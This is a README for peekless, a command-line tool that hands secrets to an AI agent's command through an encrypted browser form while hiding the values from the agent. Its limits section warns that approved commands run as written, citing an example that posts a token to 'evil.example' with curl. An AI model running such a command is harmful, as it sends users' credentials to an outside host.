# peekless

**Hand secrets to an AI agent's command without the agent ever seeing them.**

When an agent needs an API key or a password, the usual options are bad:
paste it into the chat (now it's in the transcript, the logs and the cloud),
or go find a terminal. peekless adds a third:

1. The agent writes a request: which values it needs, how to get them, and
   **the exact command or file** that will receive them.
2. `peekless run request.yaml` prints a link and a four-emoji fingerprint.
3. You open the link, check the fingerprint and the command, fill in the values, and hit send.
   Everything is encrypted in your browser.
4. peekless decrypts the answer, writes the files, runs the command with the
   values in its environment, and shows the agent only a redacted summary
   and the command's scrubbed output.

```
$ peekless run request.yaml
peekless: request ready — Cloudflare API token so I can manage DNS
Link:        https://bohdantkachenko.github.io/peekless/v0.1.0/#r=https%3A%2F%2Frelay.example&k=0t68OQ6r…
Fingerprint: 🍍 🍓 🐨 🌵
Expires:     2026-09-27T09:40:12Z (in 30m)
Waiting for the user to answer…
peekless: answer received.
  LOGIN     plain   "dan"
  CF_TOKEN  secret  [redacted: 40 chars; a-z A-Z 0-9 symbols; sha256 f571d72d; pattern ok]
peekless: running /usr/bin/sh -c 'jq -n '\''env.PEEKLESS_CF_TOKEN'\'' | sops set --value-stdin …'
--- command output (secrets scrubbed) ---
--- exit status 0 ---
```

## Why you can trust it (and where you can't)

- **End-to-end encrypted.** The key is in the link's `#fragment`, which
  browsers never send to a server. The relay stores ciphertext in memory and
  can't read or forge anything. See [spec/protocol.md](spec/protocol.md).
- **You approve the command, not a promise.** The request is frozen when it's
  created. The page shows the resolved argv, the working directory, inline
  scripts in full, file templates, and warnings for any local file the command
  references whose contents you can't see.
- **The agent sees only what you allow.** Secret values are replaced in the
  command's output (including base64 and JSON-escaped forms). Length and
  character-type metadata is opt-in per field, and you can flip any field
  between secret and plain.
- **The page is auditable.** It's a single static HTML file on GitHub Pages.
  Each release lives at its own path (`/peekless/v<version>/`), rebuilt from
  that tag, with a Sigstore build-provenance attestation. The CLI refuses to
  hand out a link to a page whose SHA-256 differs from the one it embeds. You
  can check a page yourself with `peekless verify-page`, or save it and run
  `gh attestation verify index.html --repo BohdanTkachenko/peekless`.
- **Relays are swappable and untrusted.** Use the public list, run your own
  in one command, or skip third parties entirely with `--serve`.

Limits: a relay sees IP addresses and timing (use `--proxy socks5h://…` for
Tor on the agent side). Anyone holding the link can submit to it, so share it
only with the person who should answer. And the command itself is trusted:
peekless shows it to you, but if you approve `curl evil.example -d
"$PEEKLESS_TOKEN"`, that's what runs.

## Usage

```sh
peekless check request.yaml                  # validate; print what the page will show
peekless run request.yaml                    # relay from ~/.config/peekless/config.yaml, else the bundled list
peekless run request.yaml --relay https://relay.example
peekless run request.yaml --serve 0.0.0.0:8080   # built-in relay for LAN / tailnet
peekless fill '<link>' --from-file KEY=./id_ed25519   # answer from a terminal
peekless relay --listen 0.0.0.0:8080         # run a relay
```

See [skill/SKILL.md](skill/SKILL.md) for the full request format. It is also
the agent skill.

## Running a relay

```sh
peekless relay --listen 127.0.0.1:8080
cloudflared tunnel --url http://127.0.0.1:8080    # instant HTTPS, no account
```

To add a public relay, open a PR adding it to [relays.json](relays.json). A
scheduled workflow health-checks the list and proposes removing dead relays.

## Building

```sh
nix build            # or: cargo build --release
```

Dual-licensed under MIT or Apache-2.0.
